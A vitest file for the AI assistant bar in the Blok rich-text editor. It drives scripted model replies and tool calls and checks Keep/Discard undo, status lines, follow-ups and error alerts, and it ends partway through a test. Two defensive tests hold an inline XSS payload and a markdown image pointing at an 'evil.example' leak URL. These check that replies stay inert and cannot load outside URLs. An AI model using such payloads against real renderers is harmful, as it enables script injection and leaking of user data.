import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { configure, fireEvent, getConfig, screen, waitFor, within } from '@testing-library/dom';

import { Blok } from '../../../../../src/blok';
import { releaseGap, reserveGap } from '../../../../../src/components/modules/assistant/gap';
import { getUserOS } from '../../../../../src/components/utils/browser';
import { Paragraph } from '../../../../../src/tools/paragraph';
import { Column } from '../../../../../src/tools/column';
import { ToggleItem } from '../../../../../src/tools/toggle';
import { ColumnList } from '../../../../../src/tools/column-list';
import { PageTool } from '../../../../../src/tools/page';
import { Table } from '../../../../../src/tools/table';
import type { BlokConfig, OutputData } from '../../../../../types';
import type {
  Agent,
  AgentAssistantConfig,
  AgentModel,
  AgentModelRequest,
  AgentModelResponse,
  AgentModelStreamEvent,
} from '../../../../../types/api';

interface TestEditor {
  isReady: Promise<unknown>;
  destroy: () => void;
  save: () => Promise<OutputData>;
  agent: Agent;
  readOnly: { toggle(state?: boolean): Promise<boolean> };
  toolbar: { open(): void };
  blocks: { delete(index?: number): Promise<void>; update(id: string, data: Record<string, unknown>): Promise<unknown> };
}

const settle = (ms = 0): Promise<void> => new Promise((resolve) => {
  setTimeout(resolve, ms);
});

const editors: TestEditor[] = [];

// Each status line holds 0.6s and the answer waits for the queue, so a run of
// instant model calls needs more than the default 1s wait.
const asyncTimeout = getConfig().asyncUtilTimeout;

beforeAll(() => configure({ asyncUtilTimeout: 4000 }));
afterAll(() => configure({ asyncUtilTimeout: asyncTimeout }));

const insertBatch = (text: string): AgentModelResponse => ({
  stop_reason: 'tool_use',
  content: [{
    type: 'tool_use',
    id: `use-${text}`,
    name: 'blok_execute',
    input: { commands: [{ name: 'block.insert', args: { type: 'paragraph', data: { text }, position: 'end' } }] },
  }],
});

const answer = (text: string): AgentModelResponse => ({ stop_reason: 'end_turn', content: [{ type: 'text', text }] });

const scripted = (...responses: AgentModelResponse[]): AgentModel & { requests: AgentModelRequest[] } => {
  const requests: AgentModelRequest[] = [];

  return Object.assign(async (request: AgentModelRequest) => {
    requests.push({ ...request, messages: structuredClone(request.messages) });
    const next = responses.shift();

    if (next === undefined) {
      throw new Error('unscripted model call');
    }

    return next;
  }, { requests });
};

/** A model call that waits until the test lets it answer. */
const gated = (response: AgentModelResponse): { model: AgentModel; release: () => void } => {
  const gate: { open: () => void } = { open: () => undefined };
  const opened = new Promise<void>((resolve) => {
    gate.open = resolve;
  });

  return {
    model: async (request) => {
      await Promise.race([
        opened,
        new Promise((_resolve, reject) => {
          request.signal.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')));
        }),
      ]);

      return response;
    },
    release: () => gate.open(),
  };
};

/**
 * A model whose first call streams the events the test sends, and answers once
 * the test finishes it. Later calls answer "Done.".
 */
const streaming = (): {
  model: AgentModel;
  started(): boolean;
  emit(event: AgentModelStreamEvent): void;
  finish(response: AgentModelResponse): void;
} => {
  const state: { request: AgentModelRequest | null; response: AgentModelResponse; open: () => void } = {
    request: null,
    response: answer(''),
    open: () => undefined,
  };
  const opened = new Promise<void>((resolve) => {
    state.open = resolve;
  });

  return {
    model: async (request) => {
      if (state.request !== null) {
        return answer('Done.');
      }
      state.request = request;
      await Promise.race([
        opened,
        new Promise((_resolve, reject) => {
          request.signal.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')));
        }),
      ]);

      return state.response;
    },
    started: () => state.request !== null,
    emit: (event) => state.request?.onStream?.(event),
    finish: (response) => {
      state.response = response;
      state.open();
    },
  };
};

/** A model that streams on every call: the test emits into, and answers, each call it holds. */
const liveRuns = (): { model: AgentModel; calls: Array<{ request: AgentModelRequest; finish(response: AgentModelResponse): void }> } => {
  const calls: Array<{ request: AgentModelRequest; finish(response: AgentModelResponse): void }> = [];

  return {
    calls,
    model: (request) => new Promise<AgentModelResponse>((resolve, reject) => {
      request.signal.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')));
      calls.push({ request, finish: resolve });
    }),
  };
};

const PREVIEW = '[data-blok-ai-preview]';

const previewText = (): string => (document.querySelector(PREVIEW)?.textContent ?? '').replace(/\s+/g, ' ').trim();

const executeCall = (id: string, commands: unknown[]): { json: string; use: AgentModelResponse } => ({
  json: JSON.stringify({ commands }),
  use: { stop_reason: 'tool_use', content: [{ type: 'tool_use', id, name: 'blok_execute', input: { commands } }] },
});

/** Texts of the blocks whose content plays the reveal now. */
const revealed = (): string[] => [...document.querySelectorAll('[data-blok-element-content].blok-ai-reveal')]
  .map((content) => content.textContent ?? '');

const plain = (value: unknown): string => (Array.isArray(value)
  ? value.map((segment: { text?: unknown }) => (typeof segment.text === 'string' ? segment.text : '')).join('')
  : String(value));

const texts = async (editor: TestEditor): Promise<string[]> =>
  (await editor.save()).blocks.map((block) => plain(block.data.text));

const createEditor = async (
  model: AgentModel | null,
  thinking?: AgentAssistantConfig['thinking'],
  extra: Partial<BlokConfig> = {}
): Promise<TestEditor> => {
  const holder = document.createElement('div');

  document.body.appendChild(holder);

  const config: BlokConfig = {
    holder,
    tools: { paragraph: Paragraph },
    data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }] },
    ...(model === null ? {} : { agent: { assistant: { model, name: 'Writer', ...(thinking === undefined ? {} : { thinking }) } } }),
    ...extra,
  };
  const editor = new Blok(config) as unknown as TestEditor;

  editors.push(editor);
  await editor.isReady;
  await settle();

  return editor;
};

const paragraphInput = (): HTMLElement => {
  const input = document.querySelector<HTMLElement>('[data-blok-id="p1"] [data-blok-tool="paragraph"]');

  if (input === null) {
    throw new Error('no paragraph input');
  }

  return input;
};

const pressModJ = (target: HTMLElement): KeyboardEvent => {
  const mac = getUserOS().mac;
  const event = new KeyboardEvent('keydown', {
    key: 'j', code: 'KeyJ', metaKey: mac, ctrlKey: !mac, bubbles: true, cancelable: true,
  });

  target.dispatchEvent(event);

  return event;
};

const bar = (): HTMLElement => screen.getByRole('dialog', { name: 'Ask AI' });

const submit = (prompt: string): void => {
  const field = within(bar()).getByRole('textbox');

  if (!(field instanceof HTMLTextAreaElement)) {
    throw new Error('prompt field is not a textarea');
  }
  field.value = prompt;
  field.dispatchEvent(new Event('input', { bubbles: true }));
  field.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }));
};

const scrolls = { spy: vi.fn() };

const BAR_HEIGHT = 46;
const PREVIEW_HEIGHT = 40;
const SLOTS_HEIGHT = 60;
/** The bar's gap: 6px above it and 10px below, as in the approved mockup. */
const BAR_GAP = BAR_HEIGHT + 16;

/**
 * jsdom lays nothing out. Holder n (document order) is a 24px row at 100 + 100n,
 * with its content column and fields at x 140..660. The bar is 46px tall, a preview
 * box 40px, the bar's shimmer slots 60px.
 */
/** Moves every holder by `y`, as a page scroll would. */
const pageShift = { y: 0 };

/**
 * @param holders - holder rects by block id, for side-by-side layouts (columns);
 *   their content columns sit 40px in from the holder's left
 */
const fakeLayout = (holders: Record<string, DOMRect> = {}): void => {
  pageShift.y = 0;

  const measure = HTMLElement.prototype.getBoundingClientRect;

  vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement): DOMRect {
    if (this.getAttribute('data-blok-testid') === 'assistant-bar') {
      return new DOMRect(0, parseFloat(this.style.top) || 0, 600, BAR_HEIGHT);
    }
    if (this.hasAttribute('data-blok-assistant-slots')) {
      return new DOMRect(0, 0, 600, SLOTS_HEIGHT);
    }
    if (this.hasAttribute('data-blok-ai-preview')) {
      return new DOMRect(0, 0, 520, PREVIEW_HEIGHT);
    }

    const holder = this.closest('[data-blok-element]');

    if (!(holder instanceof HTMLElement)) {
      return measure.call(this);
    }

    const top = 100 + 100 * [...document.querySelectorAll('[data-blok-element]')].indexOf(holder) + pageShift.y;

    const placed = holders[holder.getAttribute('data-blok-id') ?? ''];

    if (placed !== undefined) {
      return this === holder ? placed : new DOMRect(placed.x + 40, placed.y, placed.width - 80, placed.height);
    }

    return this === holder ? new DOMRect(100, top, 600, 24) : new DOMRect(140, top, 520, 24);
  });
};

const holderOf = (id: string): HTMLElement => {
  const holder = document.querySelector<HTMLElement>(`[data-blok-id="${id}"]`);

  if (holder === null) {
    throw new Error(`no holder ${id}`);
  }

  return holder;
};

const gapOf = (id: string): string => holderOf(id).style.getPropertyValue('--blok-ai-gap');

/** The gap held over a holder: the bar heads a part it wrote from there. */
const startGap = (holder: Element | null): string => (holder instanceof HTMLElement ? holder.style.getPropertyValue('--blok-ai-gap-start') : '');

/** Ids of the holders that hold any Ask AI gap. */
const gapped = (): string[] => [...document.querySelectorAll('[data-blok-ai-gap]')].map((holder) => holder.getAttribute('data-blok-id') ?? '');

const inputOf = (id: string): HTMLElement => {
  const input = document.querySelector<HTMLElement>(`[data-blok-id="${id}"] [data-blok-tool="paragraph"]`);

  if (input === null) {
    throw new Error(`no input in ${id}`);
  }

  return input;
};

/** Selects from (startId, startOffset) to (endId, endOffset) in the blocks' text. */
const select = (startId: string, startOffset: number, endId: string, endOffset: number): void => {
  const start = inputOf(startId);
  const end = inputOf(endId);
  const range = document.createRange();

  start.focus();
  range.setStart(start.firstChild ?? start, startOffset);
  range.setEnd(end.firstChild ?? end, endOffset);
  window.getSelection()?.removeAllRanges();
  window.getSelection()?.addRange(range);
};

const THREE_BLOCKS: Partial<BlokConfig> = {
  data: {
    blocks: [
      { id: 'p1', type: 'paragraph', data: { text: 'Hello' } },
      { id: 'p2', type: 'paragraph', data: { text: 'Second' } },
      { id: 'p3', type: 'paragraph', data: { text: 'Third' } },
    ],
  },
};

const barStyle = (): { top: string; left: string; width: string } => {
  const { top, left, width } = bar().style;

  return { top, left, width };
};

describe('in-editor assistant bar', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Ask AI follows its edits; jsdom has no scrolling.
    scrolls.spy = vi.spyOn(window, 'scrollTo').mockImplementation(() => undefined);
    // A bar opened below jsdom's window scrolls itself into view.
    vi.spyOn(window, 'scrollBy').mockImplementation(() => undefined);
  });

  afterEach(() => {
    editors.splice(0).forEach((editor) => editor.destroy());
    document.body.innerHTML = '';
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('does not open, and leaves Mod+J alone, when no assistant is configured', async () => {
    await createEditor(null);

    const event = pressModJ(paragraphInput());

    expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();
    expect(event.defaultPrevented).toBe(false);
  });

  it('opens on Mod+J with the prompt field focused and owning the keyboard', async () => {
    await createEditor(scripted());

    const event = pressModJ(paragraphInput());
    const field = within(bar()).getByRole('textbox');

    expect(event.defaultPrevented).toBe(true);
    expect(field).toHaveFocus();
    expect(bar().closest('[data-blok-keyboard-owner]')).not.toBeNull();
  });

  it('opens from editor.agent.openAssistant()', async () => {
    const editor = await createEditor(scripted());

    editor.agent.openAssistant();

    expect(bar()).toBeVisible();
  });

  it('writes from a prompt, shows the reply, and Keep closes with the edits kept', async () => {
    const editor = await createEditor(scripted(insertBatch('From AI'), answer('Added a paragraph.')));

    editor.agent.openAssistant();
    submit('Add a line');
    await waitFor(() => expect(within(bar()).getByText('Added a paragraph.')).toBeVisible());
    expect(await texts(editor)).toEqual(['Hello', 'From AI']);

    within(bar()).getByRole('button', { name: 'Keep' }).click();

    expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();
    expect(editor.agent.state.status).toBe('idle');
    expect(await texts(editor)).toEqual(['Hello', 'From AI']);
  });

  it('renders the reply as markdown, with tables, lists and bold, and keeps raw HTML inert', async () => {
    const reply = [
      'Added a **fact table**:',
      '',
      '| Fact | Detail |',
      '|---|---|',
      '| Born | 1989 |',
      '',
      '- one',
      '- two',
      '',
      'Try <img src=x onerror="alert(1)"> here.',
    ].join('\n');

    const editor = await createEditor(scripted(answer(reply)));

    editor.agent.openAssistant();
    submit('Add a table');
    await waitFor(() => expect(within(bar()).getByRole('table')).toBeVisible());

    const table = within(bar()).getByRole('table');

    expect(within(table).getByRole('columnheader', { name: 'Fact' })).toBeVisible();
    expect(within(table).getByRole('cell', { name: '1989' })).toBeVisible();
    expect(within(bar()).getAllByRole('listitem').map((item) => item.textContent)).toEqual(['one', 'two']);
    expect(bar()).toContainHTML('<strong>fact table</strong>');
    expect(within(bar()).queryByRole('img')).toBeNull();
    expect(bar()).toHaveTextContent('Try <img src=x onerror="alert(1)"> here.');
  });

  it('shows a reply image as its alt text, so a reply cannot load a URL by itself', async () => {
    const editor = await createEditor(scripted(answer([
      'See ![chart](https://evil.example/leak?d=secret) here.',
      '',
      '<p><img src="https://evil.example/raw" alt="raw"></p>',
      '',
      '**done**',
    ].join('\n'))));

    editor.agent.openAssistant();
    submit('Summarize');
    await waitFor(() => expect(bar()).toContainHTML('<strong>done</strong>'));

    expect(within(bar()).queryByRole('img')).toBeNull();
    expect(bar()).toHaveTextContent('See chart here.');
    expect(bar()).toHaveTextContent('raw');
  });

  it('Discard removes what the assistant wrote and closes', async () => {
    const editor = await createEditor(scripted(insertBatch('From AI'), answer('Done.')));

    editor.agent.openAssistant();
    submit('Add a line');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    within(bar()).getByRole('button', { name: 'Discard' }).click();
    await waitFor(() => expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull());
    expect(await texts(editor)).toEqual(['Hello']);
    expect(editor.agent.state.status).toBe('idle');
  });

  it('a run that only writes a sub-page shows Discard, not Insert, and Discard takes the sub-page back', async () => {
    const pages: Record<string, OutputData> = { sub: { blocks: [] } };
    const subCall: AgentModelResponse = { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 's1', name: 'blok_execute', input: {
      page: 'pg', commands: [{ name: 'block.insert', args: { type: 'paragraph', data: { text: 'Sub words' }, position: 'end' } }],
    } }] };
    const editor = await createEditor(scripted(subCall, answer('Wrote the sub-page.')), undefined, {
      tools: {
        paragraph: Paragraph,
        page: { class: PageTool, config: {
          loadDocument: (pageId: string) => structuredClone(pages[pageId] ?? null),
          saveDocument: (pageId: string, data: OutputData) => {
            pages[pageId] = structuredClone(data);
          },
        } },
      },
      data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }, { id: 'pg', type: 'page', data: { pageId: 'sub' } }] },
    });

    editor.agent.openAssistant();
    submit('Write the sub-page');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    expect(within(bar()).queryByRole('button', { name: 'Insert' })).toBeNull();
    within(bar()).getByRole('button', { name: 'Discard' }).click();

    await waitFor(() => expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull());
    expect(pages.sub).toEqual({ blocks: [] });
  });

  it('a run that only renames a page through the host hook shows Discard, and Discard takes the title back', async () => {
    const titles: Record<string, string> = { sub: 'Old' };
    const renameCall: AgentModelResponse = { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'r1', name: 'blok_execute', input: {
      commands: [{ name: 'page.rename', args: { id: 'pg', title: 'New' } }],
    } }] };
    const editor = await createEditor(scripted(renameCall, answer('Renamed it.')), undefined, {
      tools: {
        paragraph: Paragraph,
        page: { class: PageTool, config: {
          resolve: (pageId: string) => ({ title: titles[pageId] }),
          rename: (pageId: string, title: string) => {
            titles[pageId] = title;
          },
        } },
      },
      data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }, { id: 'pg', type: 'page', data: { pageId: 'sub' } }] },
    });

    editor.agent.openAssistant();
    submit('Rename it');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    expect(within(bar()).queryByRole('button', { name: 'Insert' })).toBeNull();
    within(bar()).getByRole('button', { name: 'Discard' }).click();

    await waitFor(() => expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull());
    expect(titles.sub).toBe('Old');
  });

  it('Discard stays open with the partial message when the host rename hook cannot take the title back', async () => {
    const titles: Record<string, string> = { sub: 'Old' };
    const renames = { count: 0 };
    const renameCall: AgentModelResponse = { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'r1', name: 'blok_execute', input: {
      commands: [{ name: 'page.rename', args: { id: 'pg', title: 'New' } }],
    } }] };
    const editor = await createEditor(scripted(renameCall, insertBatch('From AI'), answer('Done.')), undefined, {
      tools: {
        paragraph: Paragraph,
        page: { class: PageTool, config: {
          resolve: (pageId: string) => ({ title: titles[pageId] }),
          rename: (pageId: string, title: string) => {
            renames.count += 1;
            if (renames.count > 1) {
              throw new Error('offline');
            }
            titles[pageId] = title;
          },
        } },
      },
      data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }, { id: 'pg', type: 'page', data: { pageId: 'sub' } }] },
    });

    editor.agent.openAssistant();
    submit('Rename it');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    within(bar()).getByRole('button', { name: 'Discard' }).click();

    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('Some of AI\'s edits were kept'));
    expect(titles.sub).toBe('New');
    expect((await editor.save()).blocks.map((block) => block.id)).toEqual(['p1', 'pg']);
  });

  it('Discard stays open and says a restore stays when the assistant restored a version', async () => {
    const restoreCall: AgentModelResponse = { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'v1', name: 'blok_execute', input: {
      commands: [{ name: 'history.restore', args: { version: 'L:1' } }],
    } }] };
    const model = scripted(restoreCall, answer('Restored it.'));
    const restore = vi.fn(async () => true);
    const editor = await createEditor(model, undefined, {
      agent: {
        assistant: { model, name: 'Writer' },
        versionHistory: {
          list: async () => [{ version: 'L:2', savedAt: 2, actors: [] }, { version: 'L:1', savedAt: 1, actors: [] }],
          read: async () => ({ blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Older' } }] }),
          restore,
        },
      },
    });

    editor.agent.openAssistant();
    submit('Restore the older version');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    within(bar()).getByRole('button', { name: 'Discard' }).click();

    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('AI restored a version, and Discard cannot undo it.'));
    expect(restore).toHaveBeenCalledTimes(1);
  }, 15_000);

  it('Discard stays open and says so when a sub-page changed after the assistant wrote it', async () => {
    const pages: Record<string, OutputData> = { sub: { blocks: [] } };
    const subCall: AgentModelResponse = { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 's1', name: 'blok_execute', input: {
      page: 'pg', commands: [{ name: 'block.insert', args: { type: 'paragraph', data: { text: 'Sub words' }, position: 'end' } }],
    } }] };
    const editor = await createEditor(scripted(subCall, insertBatch('From AI'), answer('Done.')), undefined, {
      tools: {
        paragraph: Paragraph,
        page: { class: PageTool, config: {
          loadDocument: (pageId: string) => structuredClone(pages[pageId] ?? null),
          saveDocument: (pageId: string, data: OutputData) => {
            pages[pageId] = structuredClone(data);
          },
        } },
      },
      data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }, { id: 'pg', type: 'page', data: { pageId: 'sub' } }] },
    });

    editor.agent.openAssistant();
    submit('Write');
    await waitFor(() => expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible());
    pages.sub = { blocks: [...pages.sub.blocks, { id: 'u', type: 'paragraph', data: { text: [{ text: 'Typed' }] } }] };
    within(bar()).getByRole('button', { name: 'Discard' }).click();

    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('Some of AI\'s edits were kept'));
    expect(pages.sub.blocks.map((block) => plain(block.data.text))).toEqual(['Sub words', 'Typed']);
    expect((await editor.save()).blocks.map((block) => block.id)).toEqual(['p1', 'pg']);
  });

  it('shows Stop while working, and Stop ends the answer without closing', async () => {
    const editor = await createEditor(gated(answer('late')).model);

    editor.agent.openAssistant();
    submit('Write');
    await settle();

    const stop = within(bar()).getByRole('button', { name: 'Stop' });

    expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…');
    stop.click();

    await waitFor(() => expect(within(bar()).queryByRole('button', { name: 'Stop' })).toBeNull());
    expect(bar()).toBeVisible();
    expect(editor.agent.state.status).toBe('working');
  });

  it('keeps the model\'s notes between tool calls out of the bar while it works', async () => {
    const { model, release } = gated(answer('Added a line.'));
    const responses: AgentModelResponse[] = [{
      stop_reason: 'tool_use',
      content: [
        { type: 'text', text: 'The document has one empty paragraph. Let me check callout data fields.' },
        { type: 'tool_use', id: 'r1', name: 'blok_read', input: {} },
      ],
    }];
    const editor = await createEditor(async (request) => responses.shift() ?? model(request));

    editor.agent.openAssistant();
    submit('Write');
    await settle(20);

    expect(within(bar()).queryByText(/Let me check/)).toBeNull();
    expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…');

    release();
    await waitFor(() => expect(within(bar()).getByText('Added a line.')).toBeVisible());
    expect(editor.agent.state.status).toBe('working');
  });

  it('shows one status line naming the tool being called', async () => {
    const statuses: string[] = [];
    const editor = await createEditor(scripted(
      { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'r1', name: 'blok_read', input: {} }] },
      { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'd1', name: 'blok_describe', input: {} }] },
      insertBatch('From AI'),
      answer('Done.')
    ));
    const observer = new MutationObserver(() => {
      const text = document.querySelector('[data-blok-testid="assistant-bar"] [role="status"]')?.textContent ?? '';

      if (text !== '' && statuses.at(-1) !== text) {
        statuses.push(text);
      }
    });

    editor.agent.openAssistant();
    observer.observe(bar(), { subtree: true, childList: true, characterData: true });
    submit('Write');
    // Each line holds 0.6s, and the answer waits for the queue.
    await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible(), { timeout: 4000 });
    observer.disconnect();

    // Every step shows, in order. A Thinking a later step overtook is skipped.
    expect(statuses).toEqual([
      'Thinking…',
      'Reading the page…',
      'Looking up blocks…',
      'Writing a paragraph…',
    ]);
    expect(within(bar()).getByRole('status')).toHaveTextContent('');
  });

  it('queues lines that come faster than 0.6s and shows each for at least 0.6s, Thinking too', async () => {
    const { model, release } = gated(answer('Done.'));
    const responses: AgentModelResponse[] = [
      { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'r1', name: 'blok_read', input: {} }] },
      { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 'd1', name: 'blok_describe', input: {} }] },
      insertBatch('From AI'),
    ];
    const editor = await createEditor(async (request) => responses.shift() ?? model(request));
    const shown: Array<{ text: string; at: number }> = [];
    const observer = new MutationObserver(() => {
      const text = document.querySelector('[data-blok-testid="assistant-bar"] [role="status"]')?.textContent ?? '';

      if (text !== '' && shown.at(-1)?.text !== text) {
        shown.push({ text, at: performance.now() });
      }
    });

    editor.agent.openAssistant();
    observer.observe(bar(), { subtree: true, childList: true, characterData: true });
    submit('Write');
    await waitFor(() => expect(shown.map(({ text }) => text)).toEqual([
      'Thinking…', 'Reading the page…', 'Looking up blocks…', 'Writing a paragraph…', 'Thinking…',
    ]), { timeout: 4000 });
    observer.disconnect();

    const durations = shown.slice(1).map(({ at }, index) => at - shown[index].at);

    // The observer stamps a line late when a long task follows its render, so allow some slack.
    durations.forEach((ms) => expect(ms).toBeGreaterThanOrEqual(550));
    expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…');
    release();
    await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
  });

  it('holds the line naming a block for 0.6s before Thinking returns', async () => {
    const { model, release } = gated(answer('Done.'));
    const responses = [insertBatch('From AI')];
    const editor = await createEditor(async (request) => responses.shift() ?? model(request));

    editor.agent.openAssistant();
    submit('Write');
    await settle(50);

    // The first Thinking holds its 0.6s, so the write waits in the queue.
    expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…');
    await waitFor(() => expect(within(bar()).getByRole('status')).toHaveTextContent('Writing a paragraph…'));
    await settle(400);
    expect(within(bar()).getByRole('status')).toHaveTextContent('Writing a paragraph…');
    await waitFor(() => expect(within(bar()).getByRole('status')).toHaveTextContent('Thinking…'));
    release();
    await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
  });

  it('lets the host reword the status line through i18n messages', async () => {
    const holder = document.createElement('div');

    document.body.appendChild(holder);

    const editor = new Blok({
      holder,
      tools: { paragraph: Paragraph },
      data: { blocks: [{ id: 'p1', type: 'paragraph', data: { text: 'Hello' } }] },
      i18n: { messages: { 'assistant.status.thinking': 'Mulling it over…' } },
      agent: { assistant: { model: gated(answer('late')).model } },
    }) as unknown as TestEditor;

    editors.push(editor);
    await editor.isReady;
    await settle();

    editor.agent.openAssistant();
    submit('Write');
    await settle();

    expect(within(bar()).getByRole('status')).toHaveTextContent('Mulling it over…');
  });

  it('sends a second prompt as a follow-up in the same conversation', async () => {
    const model = scripted(answer('First answer'), answer('Second answer'));
    const editor = await createEditor(model);

    editor.agent.openAssistant();
    submit('One');
    await waitFor(() => expect(within(bar()).getByText('First answer')).toBeVisible());
    submit('Two');
    await waitFor(() => expect(within(bar()).getByText('Second answer')).toBeVisible());
    expect(model.requests[1].messages.filter((message) => message.role === 'user')).toHaveLength(2);
    expect(editor.agent.state.status).toBe('working');
  });

  it('keeps a follow-up field under the answer, next to Discard and Keep', async () => {
    const editor = await createEditor(scripted(insertBatch('From AI'), answer('Added a paragraph.\n\nIt says hello back.')));

    editor.agent.openAssistant();
    submit('Add a line');
    await waitFor(() => expect(within(bar()).getByText('Added a paragraph.')).toBeVisible());

    const field = within(bar()).getByRole('textbox');
    const summary = within(bar()).getByText('Added a paragraph.');

    expect(field).toBeVisible();
    expect(field).toHaveAttribute('placeholder', 'Ask a question or request a change…');
    expect(field).toHaveFocus();
    expect(within(bar()).getByRole('button', { name: 'Send' })).toBeVisible();
    expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible();
    expect(within(bar()).getByRole('button', { name: 'Keep' })).toBeVisible();
    // Read top to bottom: the answer, its rest, then the field.
    expect(summary.compareDocumentPosition(field) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();

    fireEvent.input(field, { target: { value: 'Make it shorter' } });

    expect(summary).toBeVisible();
    expect(within(bar()).getByRole('button', { name: 'Discard' })).toBeVisible();
    expect(within(bar()).getByRole('button', { name: 'Keep' })).toBeVisible();
    expect(within(bar()).getByRole('button', { name: 'Send' })).toBeEnabled();
  });

  it('after an edit, shows only the reply\'s first line: one short note on what was done', async () => {
    const editor = await createEditor(scripted(insertBatch('From AI'), answer([
      'Added a paragraph at the end.',
      '',
      '- block `p-new`, after the intro',
      '',
      '| Block | Change |',
      '|---|---|',
      '| p-new | inserted |',
    ].join('\n'))));

    editor.agent.openAssistant();
    submit('Add a line');
    await waitFor(() => expect(within(bar()).getByText('Added a paragraph at the end.')).toBeVisible());
    await settle(50);

    expect(bar()).not.toHaveTextContent('p-new');
    expect(within(bar()).queryByRole('table')).toBeNull();
    expect(within(bar()).queryByRole('listitem')).toBeNull();
  });

  it('a question asked after an edit gets its whole answer', async () => {
    const editor = await createEditor(scripted(
      insertBatch('From AI'),
      answer('Added a paragraph.'),
      answer('It has two parts.\n\n- the intro\n- the new line')
    ));

    editor.agent.openAssistant();
    submit('Add a line');
    await waitFor(() => expect(within(bar()).getByText('Added a paragraph.')).toBeVisible());
    submit('What is on the page now?');
    await waitFor(() => expect(within(bar()).getAllByRole('listitem').map((item) => item.textContent)).toEqual(['the intro', 'the new line']));
  });

  it('keeps the follow-up field after an answer that changed nothing', async () => {
    const editor = await createEditor(scripted(answer('The page has one paragraph.')));

    editor.agent.openAssistant();
    submit('How long is this page?');
    await waitFor(() => expect(within(bar()).getByText('The page has one paragraph.')).toBeVisible());

    expect(within(bar()).getByRole('textbox')).toBeVisible();
    expect(within(bar()).getByRole('textbox')).toHaveAttribute('placeholder', 'Ask a question or request a change…');
    expect(within(bar()).queryByRole('button', { name: 'Discard' })).toBeNull();
    expect(within(bar()).queryByRole('button', { name: 'Keep' })).toBeNull();
  });

  it('keeps the follow-up field under a failed call\'s alert', async () => {
    const editor = await createEditor(async () => {
      throw new Error('No API key');
    });

    editor.agent.openAssistant();
    submit('Write');
    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('No API key'));

    expect(within(bar()).getByRole('textbox')).toBeVisible();
    expect(within(bar()).getByRole('textbox')).toHaveAttribute('placeholder', 'Ask a question or request a change…');
  });

  it('after the step limit, Continue resumes the same conversation and the field stays', async () => {
    const model = scripted(insertBatch('Part one'), answer('Finished the rest.'));
    const editor = await createEditor(null, undefined, { agent: { assistant: { model, maxSteps: 1 } } });

    editor.agent.openAssistant();
    submit('Write a long page');
    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('AI stopped after too many steps.'));

    const resume = within(bar()).getByRole('button', { name: 'Continue' });

    expect(resume).toBeVisible();
    expect(within(bar()).getByRole('textbox')).toBeVisible();

    fireEvent.click(resume);
    await waitFor(() => expect(within(bar()).getByText('Finished the rest.')).toBeVisible());

    expect(model.requests).toHaveLength(2);
    expect(model.requests[1].messages[0]).toEqual({ role: 'user', content: expect.stringContaining('Write a long page') });
    expect(within(bar()).queryByRole('button', { name: 'Continue' })).toBeNull();
  });

  it('shows no Continue button for other stops', async () => {
    const editor = await createEditor(async () => {
      throw new Error('No API key');
    });

    editor.agent.openAssistant();
    submit('Write');
    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('No API key'));

    expect(within(bar()).queryByRole('button', { name: 'Continue' })).toBeNull();
  });

  it('shows a failed model call as an alert', async () => {
    const editor = await createEditor(async () => {
      throw new Error('No API key');
    });

    editor.agent.openAssistant();
    submit('Write');

    await waitFor(() => expect(within(bar()).getByRole('alert')).toHaveTextContent('No API key'));
  });

  it('Escape stops a running answer first, then closes the bar keeping the edits', async () => {
    const editor = await createEditor(gated(answer('late')).model);

    editor.agent.openAssistant();
    submit('Write');
    await settle();

    const field = within(bar()).getByRole('textbox');

